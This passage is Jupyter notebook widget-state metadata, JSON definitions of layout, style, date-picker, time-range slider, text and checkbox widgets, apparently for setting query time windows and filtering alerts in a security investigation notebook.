      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "6c0785df674442a3ae5c8434b62ab908": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "6c6ac4ccfe8b4229b7517a390a521f8f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "6e0b797586524ef6b7750951d823b710": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (min):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_30424672831b4d328a4847fd055419ed",
       "min": -600,
       "style": "IPY_MODEL_65814959b0aa4e06a381a977ad4dc6a9",
       "value": [
        -90,
        22
       ]
      }
     },
     "6f76ed87803d440bb8535640b6b08d1e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "7022e1a901d24788990cd1ffc279f91b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "716191af7d1f444a985d5b93ee3e4cc1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "718793d1c4be4f80843060015af8c16d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (min):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_0f2f980450964310a01dbc26eebd2786",
       "min": -600,
       "style": "IPY_MODEL_dc9ea094a31e4c5b8d5de8d78e55b19a",
       "value": [
        -60,
        10
       ]
      }
     },
     "7200e36683994493b0ad1802d5d2e8d8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "72ad58f2313a42aa9f3343f4b498d68f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "border": "1px solid black",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "7374809cbbc9407fa15ec3b91288c5d1": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "73eba89b5d8a4ee8b656dfa58166bf4a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_06df193c957e42c48c57cf541dc4c802",
       "style": "IPY_MODEL_fe43b50ec82748eaa728247f81fb64b8",
       "value": "21:30:30.145032"
      }
     },
     "73f30ba22adf4c38b14d54ea956693cc": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "74fe927ede2041fd80a6503761e0ff23": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "756b50acaf27453992cb338aa29ae7c6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "797ffede59f94a7d8dc75ffe6a6547e0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "7aee2372f9a94da298495709070f9944": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_eb3a8d772f4c4858b88ab339bf9fa6f5",
       "style": "IPY_MODEL_4bf78d6f7c17453fbce6f6e123bc0fcf",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "7b22f2aa474c47c793fb79327ddd3784": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "7bd6082696f94668b4c8bde66e0d3a73": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "7d490adb22804cb0b0ae74fa3c1f7e80": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "7dc692929a214ae0972ff7d85cc157aa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_d8622620ac354b089763df091127c13b",
       "style": "IPY_MODEL_a9c51ce5f3a440619fe6067431c30092",
       "value": "21:37:31"
      }
     },
     "7dfded9b300f46a3b4d5c0fc6ee685e3": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "7e9a123d5ec44188a70ed2e2b2a755d0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "7efab6b4a8994b59bdc285576e765320": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "8109812cd0d143c4882a539278540529": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_d9e0c3fe5dff4fcfa98607d74f2c8e48",
       "style": "IPY_MODEL_092a1cf9b4a24cd2a6bb76d4d3dc08b9",
       "value": "2019-02-11 05:38:41"
      }
     },
     "828e96047b8a422db176e8b672f977cd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_7e9a123d5ec44188a70ed2e2b2a755d0",
       "style": "IPY_MODEL_9aaefa295a584809b2d475d03220cfd3",
       "value": "2019-02-09 05:38:41"
      }
     },
     "82f922f7b1cf4ecdb516f585161ba208": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "8824bf504a1d4b41be7a13e3a98c156e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "897f8f905f4141e1995014deec3afa58": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_9e8dd475d3ea425ea8f573f4f3e440b0",
       "style": "IPY_MODEL_046425c6a0d14b7a93d711c8de74258d",
       "value": {
        "date": 12,
        "month": 8,
        "year": 2019
       }
      }
     },
     "89be4ecd0e8841b98b8a976a4ed1c2df": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "95%"
      }
     },
     "8a0491c389294cfb864ae06174189ad9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_e74658d67c6d4bff99b0d9ea4da6b297",
        "IPY_MODEL_17b75093b2d04548ad3bda3e263c7355",
        "IPY_MODEL_c4fc62fc8fa14522bea8c3694329cc48"
       ],
       "layout": "IPY_MODEL_fe334838124d4e1c9f0999c0a03e7329"
      }
     },
     "8a06f70b32ba4e5d894034ceb3837186": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "8e1086fc5f1d4b4295d81310e84180cd": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "8e92c8bad57d4f1495e0db0eaa7b70fa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "94695e82c0a74b8c899ce59a9eeb84ac": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "CheckboxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Center subsequent query times round selected Alert?",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_fe8a77a4fd294f77b3bd45368a74fb98",
       "style": "IPY_MODEL_aa141443031b4b54a5c3e51235b0248d",
       "value": true
      }
     },
     "9505fe8452f1414390c0a29e907fdf39": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_328dad562fc248888baa7c9be2e00ef0",
       "style": "IPY_MODEL_2f0deff18fbd47f6be99656a00a2218c",
       "value": {
        "date": 12,
        "month": 8,
        "year": 2019
       }
      }
     },
     "9690171728584cb39f6cb8bd04174d41": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "97102f7381264aa5b18f7d19fe4f737b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "984dbe01577849b0923b3bf81f826218": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Filter alerts by title:",
       "description_tooltip": null,
       "layout": "IPY_MODEL_b9e22418835049b984dd56f60c26a43a",
       "style": "IPY_MODEL_c6f575dd56994e33a826c2bc72bab586"
      }
     },
     "9a0767de7c7a4834ae396e028386f789": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "9a78f1e48f4349a09815fa04cfc3afff": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "9aaefa295a584809b2d475d03220cfd3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "9c7d470558804e558e4c959acca07aaf": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "9cd3ee04526b4736810a1aa2fb2355d6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "border": "1px solid black",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "9ce002133ebe4b4ea6abe6b993d44df5": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "9e101b08df5f42079fcf823e94910f28": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "9e8dd475d3ea425ea8f573f4f3e440b0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "9f6be46a70d447ad8aea068a4b4f4a34": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "a0b4260daead43f4877c88b13a3708cb": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "a18316a28ac84e94883a5ce50cf87bbd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "a1a4ca7dd2e94904ad3240868c7c30ca": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "a1e01d719b2845a3aa35b9ace3925640": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "CheckboxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Center subsequent query times round selected Alert?",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_fe8a77a4fd294f77b3bd45368a74fb98",
       "style": "IPY_MODEL_797ffede59f94a7d8dc75ffe6a6547e0",
       "value": true
      }
     },
     "a236a6a3717541eeab602ecb87109f98": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_4d46a2df2fe246b5885dd6d793e9d248",
       "style": "IPY_MODEL_9f6be46a70d447ad8aea068a4b4f4a34",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "a4699592fbf24981a5635839b4591306": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "a6cd20427cfa44aea96f73c110985455": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "a9c51ce5f3a440619fe6067431c30092": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "a9cb3490c25e490bb4998840da3d8443": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "a9f2e51727334a5b9f00c07313c40d46": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_30733e60125342d09307c47ea512e85b",
       "style": "IPY_MODEL_a1a4ca7dd2e94904ad3240868c7c30ca",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "aa141443031b4b54a5c3e51235b0248d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "aa3603b7423847888a595421c1de8fe7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "aa9432dc8843479db8eca6453a91212b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_897f8f905f4141e1995014deec3afa58",
        "IPY_MODEL_f6665269d1984323b6126812b912255f"
       ],
       "layout": "IPY_MODEL_3220bf1b1804478086827606b4d2d2b8"
      }
     },
     "ab68b1a072c147db80c7140aeb7b4cb4": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "abec39d9d82c4c04b1bb4b1615d5894a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_3276da8638ef4a7f93310e88c7599465",
       "style": "IPY_MODEL_5ba436ca9747498db5bc819183a1a57e",
       "value": "2019-09-12 21:37:31"
      }
     },
     "ac489e6c4b844fe9a8f670b2ebc49519": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "aca4f790a681450c9159c94edd2711fc": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "adc8873c90cb4c9f8be782a6fa15c985": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_28175d0483bb4e2d8b4cc046265b959f",
       "style": "IPY_MODEL_31735f4634794cc1815d1cee6d7cb6fa",
       "value": "2019-02-10 05:38:41"
      }
     },
     "ae65e95709904858a6afa3e639f4a39d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_6c0785df674442a3ae5c8434b62ab908",
       "style": "IPY_MODEL_0eaf4482c501451c9e7929a84abac080",
       "value": "05:38:41"
      }
     },
     "af13e8700564423cb5c5c7e37ea0c0f0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "b1a91d8b131a4ed484516bde422d13a2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_4ad4f06e556d4d73ab74964d8a5daf41",
       "style": "IPY_MODEL_aa3603b7423847888a595421c1de8fe7",
       "value": "06:15:06"
      }
     },
     "b1e281669e5e4b979e1bce542d667d80": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_9a0767de7c7a4834ae396e028386f789",
       "style": "IPY_MODEL_f62bbe93c9e944288bc143f4f6e69ad0",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "b29d45f3bd84494081330a3ca2223920": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
